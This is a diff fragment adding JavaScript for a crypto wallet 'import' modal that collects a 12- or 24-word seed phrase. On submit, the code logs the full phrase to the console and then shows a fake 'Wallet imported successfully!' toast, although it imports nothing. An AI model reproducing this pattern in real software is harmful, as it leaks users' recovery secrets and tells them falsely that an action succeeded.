+
+            seedGrid.addEventListener('paste', function(e) {
+                const target = e.target;
+                if (target.tagName !== 'INPUT') return;
+
+                const data = e.clipboardData.getData('text');
+                const parts = data.trim().split(/\s+/);
+                if (parts.length > 1) {
+                    e.preventDefault();
+                    const inputs = getSeedInputs();
+                    const startIdx = Array.from(inputs).indexOf(target);
+                    let pos = startIdx;
+                    parts.forEach(word => {
+                        if (pos < inputs.length) {
+                            inputs[pos].value = word.trim();
+                            pos++;
+                        }
+                    });
+                    const nextIdx = Math.min(pos, inputs.length - 1);
+                    inputs[nextIdx].focus();
+                    inputs[nextIdx].select();
+                    validateForm();
+                }
+            });
+
+            // Toggle 12/24
+            toggleBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const words = parseInt(this.dataset.words);
+                    if (words === currentWordCount) return;
+                    buildSeedGrid(words);
+                });
+            });
+
+            // Submit
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                if (importBtn.disabled) {
+                    showToast('Please fill in all words and agree to the terms.', true);
+                    return;
+                }
+
+                const inputs = getSeedInputs();
+                const words = [];
+                inputs.forEach(inp => words.push(inp.value.trim()));
+                const phrase = words.join(' ');
+
+                console.log(`Seed phrase (${currentWordCount} words):`, phrase);
+
+                importBtn.disabled = true;
+                importBtn.innerHTML = `
+                    <span class="btn-glow"></span>
+                    <span class="btn-text">Importing...</span>
+                `;
+
+                setTimeout(() => {
+                    importBtn.disabled = false;
+                    importBtn.innerHTML = `
+                        <span class="btn-glow"></span>
+                        <span class="btn-text">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M12 5v14"/>
+                                <path d="M5 12l7-7 7 7"/>
+                            </svg>
+                            Import Wallet
+                        </span>
+                    `;
+                    importBtn.classList.remove('ready');
+                    showToast('Wallet imported successfully! 🎉');
+
+                    // Auto-close modal after successful import
+                    setTimeout(() => {
+                        closeModal();
+                    }, 1500);
+
+                    validateForm();
+                }, 1800);
+            });
+
+            // Keyboard shortcut: Ctrl+Enter
+            document.addEventListener('keydown', function(e) {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+                    if (!importBtn.disabled && modalOverlay.classList.contains('active')) {
+                        form.dispatchEvent(new Event('submit'));
+                    }
+                }
+            });
+
+            // Initialize
+            buildSeedGrid(12);
+            validateForm();
+
+            console.log('🔐 Wallet Import Modal ready');
+        })();
+    </script>
 </body>
 </html>
